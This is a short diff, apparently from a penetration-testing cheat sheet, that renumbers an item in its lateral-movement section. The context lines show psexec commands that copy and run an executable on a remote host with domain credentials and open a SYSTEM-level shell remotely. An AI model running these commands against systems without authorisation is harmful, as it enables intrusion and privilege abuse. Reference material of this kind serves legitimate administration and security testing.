@@ -49,4 +49,4 @@ Persistence:
 
 Lateral Movement And Execution:
 1. psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)
-3. psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)
+2. psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)
